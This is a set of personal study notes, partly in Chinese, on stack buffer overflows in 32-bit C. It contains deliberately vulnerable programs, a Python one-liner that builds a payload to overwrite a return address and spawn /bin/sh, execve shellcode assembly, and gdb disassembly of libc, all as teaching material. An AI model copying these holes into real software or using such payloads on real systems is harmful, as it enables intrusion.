========================================
Security
========================================

Useful Commands
========================================

* file
* hexdump
* ldd
* objdump
* strace
* ltrace
* valgrind
* dmesg

Binary to Assembly
========================================

.. code-block:: sh

    $ sudo pacman -S nasm
    $ ndisasm BINARY

Memory Checking
========================================

.. code-block:: sh

    $ sudo pacman -S valgrind-multilib  # for both x86_64 and x86

IDA Pro
========================================


Buffer Overflow
========================================

Buffer Overflow - Example 1
------------------------------

hack EIP in your own code

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>     // system

    void func() {
        printf("buffer overflow\n");
        system("/bin/sh");
    }

    void bof() {
        char buf[10];
        *(int *) &buf[10 + 4] = func;   // buf[10] => ebp, buf[14] => eip
    }

    int main() {
        bof();
        return 0;
    }

    /*

    In order to address all memory, pointer is 32 bits (4 bytes) on 32 bits machine

            +-----------------+ high address
            |                 |
            |                 |
            +-----------------+
            | Stack         | |
            |               | |
            |               v |
            +-----------------+
            |                 |
            | ...             |
            |                 |
            +-----------------+
            | (main)          |
            | return address  |
            | (eip)           |
    EBP+12  |                 |
            +-----------------+
            | (main)          |
            | saved ebp       |
            |                 |
    EBP+8   |                 |
            +-----------------+
            | (bof)           |        EIP
            | return address  |        EIP
            | (eip)           |        EIP
    EBP+4   |                 | <----- EIP
            +-----------------+
            | (bof)           |        EBP
            | saved ebp       |        EBP
            |                 |        EBP
    EBP     |                 | <----- EBP
            +-----------------+
            | buf[9]          |
            | buf[8]          |
            | buf[7]          |
            | buf[6]          |
            | buf[5]          |
            | buf[4]          |
            | buf[3]          |
            | buf[2]          |
            | buf[1]          |
    EBP-10  | buf[0]          | <----- buf
            +-----------------+
            | ...             |
            |                 |
            +-----------------+ low address

    */


compile

.. code-block:: sh

    $ gcc -m32 bof_1.c -o bof_1



Buffer Overflow - Example 2
------------------------------

hack EIP in your own code (with arguments)

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>     // system

    void func() {
        printf("buffer overflow\n");
        system("/bin/sh");
    }

    void bof(long a, long b, long c, long d,
             long e, long f, long g, long h) {

        printf("bof test\n");
        char buf[10];
        *(int *) &buf[10 + 8 + 4] = func;

    }

    int main(int argc, char *argv[]) {
        printf("start\n");
        bof(1, 2, 3, 4, 5, 6, 7, 8);
        printf("end\n");
        return 0;
    }

    /*

    In order to address all memory, pointer is 32 bits (4 bytes) on 32 bits machine

            +-----------------+ high address
            |                 |
            |                 |
            +-----------------+
            | Stack         | |
            |               | |
            |               v |
            +-----------------+
            |                 |
            | ...             |
            |                 |
            +-----------------+
            | (main)          |
            | return address  |
            | (eip)           |
            |                 |
            +-----------------+
            | (main)          |
            | ???             |
            | (20 bytes)      |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            +-----------------+
            | (main)          |
            | saved ebp       |
            |                 |
            |                 |
            +-----------------+
            | ???             |
            | 8 bytes         |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | h               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | g               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | f               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | e               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | d               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | c               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | b               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |
            | a               |
            |                 |
            |                 |
            +-----------------+
            | (bof)           |        EIP
            | return address  |        EIP
            | (eip)           |        EIP
    EBP+4   |                 | <----- EIP
            +-----------------+
            | (bof)           |        EBP
            | saved ebp       |        EBP
            |                 |        EBP
    EBP     |                 | <----- EBP
            +-----------------+
            | ???             |
            | 8 bytes         |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            |                 |
            +-----------------+
            | buf[9]          |
            | buf[8]          |
            | buf[7]          |
            | buf[6]          |
            | buf[5]          |
            | buf[4]          |
            | buf[3]          |
            | buf[2]          |
            | buf[1]          |
            | buf[0]          | <----- buf
            +-----------------+
            | ...             |
            |                 |
            +-----------------+ low address

    */


compile

.. code-block:: sh

    $ gcc -m32 bof_2.c -o bof_2


Buffer Overflow - Example 3
------------------------------

hack EIP by scanf

(notice: scanf 和 gets 都會在結尾加上 '\0')

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>     // system

    void func() {
        printf("buffer overflow\n");
        system("/bin/sh");
    }

    void bof(long a, long b, long c, long d,
             long e, long f, long g, long h) {

        printf("bof test\n");
        char buf[10];
        scanf("%s", buf);

    }

    int main(int argc, char *argv[]) {
        printf("start\n");
        bof(1, 2, 3, 4, 5, 6, 7, 8);
        printf("end\n");
        return 0;
    }


compile

.. code-block:: sh

    $ gcc -m32 bof_3.c -o bof_3


generate input

.. code-block:: sh

    $ readelf -a ./bof_3  | grep func   # func's address is 0x080484fb
        40: 080484fb    41 FUNC    GLOBAL DEFAULT   13 func
    $ python -c "print('0123456789123456781234' + chr(0xfb) + chr(0x84) + chr(0x04) + chr(0x08))" > input.utf8
    $ iconv -f utf-8 -t iso-8859-1 input.utf8 > input.latin1    # use eight-bit ASCII extensions instead of UTF8
    $ ./bof_3 < input.latin1
    start
    bof test
    buffer overflow
    Segmentation fault (core dumped)


Buffer Overflow - Example 4
------------------------------

[todo]

inject your code (shellcode)

.. code-block:: c

    #include <stdio.h>

    void bof(long a, long b, long c, long d,
             long e, long f, long g, long h) {

        printf("bof test\n");
        char buf[10];
        scanf("%s", buf);

    }

    int main(int argc, char *argv[]) {
        printf("start\n");
        bof(1, 2, 3, 4, 5, 6, 7, 8);
        printf("end\n");
        return 0;
    }


Assembly Practice
++++++++++++++++++++

寫到 stdout：

.. code-block:: asm

    .data
    msg:
        .ascii "Hello World!\n"

    .text
    .globl _start

    _start:
        movl $4, %eax   # use the write syscall
        movl $1, %ebx   # write to stdout
        movl $msg, %ecx # use string of msg
        movl $13, %edx  # write 13 characters
        int $0x80       # make syscall

        movl $1, %eax   # use the _exit syscall
        movl $0, %ebx   # error code 0
        int $0x80       # make syscall

使用 execve system call

.. code-block:: asm

    .data
    cmd:
        .ascii "/bin/sh"

    .text
    .globl _start

    _start:
        movl $11, %eax  # use the execve syscall
        movl $cmd, %ebx # use string of cmd
        int $0x80       # make syscall

        movl $1, %eax   # use the _exit syscall
        movl $0, %ebx   # error code 0
        int $0x80       # make syscall


ignore _exit, make it shorter

.. code-block:: asm

    .data
    cmd:
        .ascii "/bin/sh"

    .text
    .globl _start

    _start:
        movl $11, %eax  # use the execve syscall
        movl $cmd, %ebx # use string of cmd
        int $0x80       # make syscall


compile

.. code-block:: sh

    $ gcc -nostdlib practice.s -o practice


觀察
++++++++++++++++++++

.. code-block:: sh

    $ gdb /usr/lib32/libc.so.6
    (gdb) disassemble execve
    Dump of assembler code for function execve:
    0x000b29a0 <+0>:     push   %ebx
    0x000b29a1 <+1>:     mov    0x10(%esp),%edx  # put address of **envp into edx register
    0x000b29a5 <+5>:     mov    0xc(%esp),%ecx   # put address of **argv into ecx register
    0x000b29a9 <+9>:     mov    0x8(%esp),%ebx   # put address of *filename into ebx register
    0x000b29ad <+13>:    mov    $0xb,%eax        # put 0xb in eax register; 0xb == execve in the internal system call table (32 bits Linux kernel)
    0x000b29b2 <+18>:    call   *%gs:0x10
    0x000b29b9 <+25>:    pop    %ebx
    0x000b29ba <+26>:    cmp    $0xfffff001,%eax
    0x000b29bf <+31>:    jae    0xb29c2 <execve+34>
    0x000b29c1 <+33>:    ret
    0x000b29c2 <+34>:    call   0x12158d <__x86.get_pc_thunk.cx>
    0x000b29c7 <+39>:    add    $0x100639,%ecx
    0x000b29cd <+45>:    mov    -0xe4(%ecx),%ecx
    0x000b29d3 <+51>:    neg    %eax
    0x000b29d5 <+53>:    add    %gs:0x0,%ecx
    0x000b29dc <+60>:    mov    %eax,(%ecx)
    0x000b29de <+62>:    or     $0xffffffff,%eax
    0x000b29e1 <+65>:    ret
    End of assembler dump.
    (gdb) disassemble system
    Dump of assembler code for function system:
    0x0003ae00 <+0>:     sub    $0xc,%esp
    0x0003ae03 <+3>:     mov    0x10(%esp),%eax
    0x0003ae07 <+7>:     call   0x121585 <__x86.get_pc_thunk.dx>
    0x0003ae0c <+12>:    add    $0x1781f4,%edx
    0x0003ae12 <+18>:    test   %eax,%eax
    0x0003ae14 <+20>:    je     0x3ae20 <system+32>
    0x0003ae16 <+22>:    add    $0xc,%esp
    0x0003ae19 <+25>:    jmp    0x3a8a0 <do_system>
    0x0003ae1e <+30>:    xchg   %ax,%ax
    0x0003ae20 <+32>:    lea    -0x55d5f(%edx),%eax
    0x0003ae26 <+38>:    call   0x3a8a0 <do_system>
    0x0003ae2b <+43>:    test   %eax,%eax
    0x0003ae2d <+45>:    sete   %al
    0x0003ae30 <+48>:    add    $0xc,%esp
    0x0003ae33 <+51>:    movzbl %al,%eax
    0x0003ae36 <+54>:    ret
    End of assembler dump.

.. code-block:: sh

    $ gdb /usr/lib/libc.so.6
    (gdb) disassemble execve
    Dump of assembler code for function execve:
    0x00000000000b7c90 <+0>:     mov    $0x3b,%eax
    0x00000000000b7c95 <+5>:     syscall
    0x00000000000b7c97 <+7>:     cmp    $0xfffffffffffff001,%rax
    0x00000000000b7c9d <+13>:    jae    0xb7ca0 <execve+16>
    0x00000000000b7c9f <+15>:    retq
    0x00000000000b7ca0 <+16>:    mov    0x2e41b1(%rip),%rcx        # 0x39be58
    0x00000000000b7ca7 <+23>:    neg    %eax
    0x00000000000b7ca9 <+25>:    mov    %eax,%fs:(%rcx)
    0x00000000000b7cac <+28>:    or     $0xffffffffffffffff,%rax
    0x00000000000b7cb0 <+32>:    retq
    End of assembler dump.
    (gdb) disassemble system
    Dump of assembler code for function system:
    0x000000000003f820 <+0>:     test   %rdi,%rdi
    0x000000000003f823 <+3>:     je     0x3f830 <system+16>
    0x000000000003f825 <+5>:     jmpq   0x3f2b0 <do_system>
    0x000000000003f82a <+10>:    nopw   0x0(%rax,%rax,1)
    0x000000000003f830 <+16>:    lea    0x124449(%rip),%rdi        # 0x163c80
    0x000000000003f837 <+23>:    sub    $0x8,%rsp
    0x000000000003f83b <+27>:    callq  0x3f2b0 <do_system>
    0x000000000003f840 <+32>:    test   %eax,%eax
    0x000000000003f842 <+34>:    sete   %al
    0x000000000003f845 <+37>:    add    $0x8,%rsp
    0x000000000003f849 <+41>:    movzbl %al,%eax
    0x000000000003f84c <+44>:    retq
    End of assembler dump.


Buffer Overflow - Example 5
------------------------------

[todo]


Buffer Overflow - Example 6
------------------------------

[todo]

